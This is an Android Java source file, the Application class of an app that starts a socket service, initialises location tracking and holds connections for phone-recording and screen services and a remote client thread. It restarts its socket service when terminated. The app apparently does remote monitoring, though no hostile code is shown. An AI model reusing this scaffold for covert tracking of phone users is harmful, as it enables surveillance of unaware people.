package com.view.core;

import android.app.Application;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;

import com.view.core.activitys.PhoneRecordActivity;
import com.view.core.services.SocketService;
import com.view.core.thread.ClientThread;
import com.view.core.utils.LocationUtil;

/**
 * @author:  xxx
 * @create: 2019/12/25 下午8:53
 * @email:  xxx.xxx.xxx
 * @version:
 * @descripe:
 **/
public class MyApplication extends Application {

//    private static final String TAG = MyApplication.class.getSimpleName();
    private static final String TAG = SocketService.class.getSimpleName();

    private static Context mContext ;
    private Handler mHandler = new Handler();
    private ClientThread mClientThread = null;
    private PhoneRecordActivity.PhoneServiceConnection mPhoneServiceConnection;
    private ServiceConnection mScreenServiceConnection;

    private Intent mSocketIntent = null;
    public static String process = null;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "onCreate: executed");
        mContext = this;

        process = getProcessName();
        Log.d(TAG, "onCreate: process name="+ process);
        LocationUtil.getInstance().initLocationManager(mContext);
    }

    public static Context getContext(){
        return mContext;
    }

    public void startSocketService(){
        Log.d(TAG, "startSocketService: executed "+ android.os.Process.myPid());
        if(mSocketIntent == null) {
            mSocketIntent = new Intent();
            mSocketIntent.setClass(this, SocketService.class);
            mSocketIntent.setPackage(getPackageName());
            mSocketIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
//            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
//                startForegroundService(mSocketIntent);
//            } else {
//                startService(mSocketIntent);
//            }
            startService(mSocketIntent);
            Log.d(TAG, "startSocketService: start success!");
        }
//        bindService(mSocketIntent, mSocketConnection, Context.BIND_AUTO_CREATE);
    }

    private void stopSocketService(){
        if(mSocketIntent != null){
            Log.d(TAG, "stopSocketService: stop success");
            stopService(mSocketIntent);
            mSocketIntent = null;
        }
    }

    private static ServiceConnection mSocketConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            Log.d(TAG, "onServiceConnected: "+ name);
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
            Log.d(TAG, "onServiceDisconnected: "+ name);
        }
    };

    public static ServiceConnection getSocketConnection(){
        return mSocketConnection;
    };

    public ClientThread getRemoteClient(){
        return mClientThread;
    }

    public void setPhoneServiceConnection(PhoneRecordActivity.PhoneServiceConnection connection){
        mPhoneServiceConnection = connection;
    }

    public void setScreenServiceConnection(ServiceConnection connection){
        mScreenServiceConnection = connection;
    }

    public PhoneRecordActivity.PhoneServiceConnection getPhoneServiceConnection(){
        return mPhoneServiceConnection;
    }

    public ServiceConnection getScreenServiceConnection(){
        return mScreenServiceConnection;
    }

    @Override
    public void onTerminate(){
        super.onTerminate();
        Log.d(TAG, "onTerminate: executed");
        LocationUtil.getInstance().destoryLocationManager();
        startSocketService();
    }

    @Override
    public void onTrimMemory(int level) {
        super.onTrimMemory(level);
        Log.d(TAG, "onTrimMemory: executed");
    }

    @Override
    public void onLowMemory() {
        super.onLowMemory();
        Log.d(TAG, "onLowMemory: executed");
    }
}
